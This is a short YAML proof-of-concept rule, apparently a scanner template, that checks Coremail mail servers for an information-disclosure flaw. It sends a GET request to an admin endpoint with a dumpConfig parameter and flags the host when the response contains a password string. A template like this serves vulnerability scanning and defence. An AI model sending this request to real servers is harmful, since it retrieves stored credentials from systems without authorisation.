name: poc-yaml-coremail-information-disclosure
rules:
  - method: GET
    path: >-
      /mailsms/s?func=ADMIN:appState&dumpConfig=/
    follow_redirects: false
    expression: >
      status==200 && r'"Password">[a-zA-Z0-9~!@&%#_]{6,32}</string>'.bmatches(body)
detail:
  author: cc_ci(https://github.com/cc8ci)
  links:
    - https://www.secpulse.com/archives/107611.html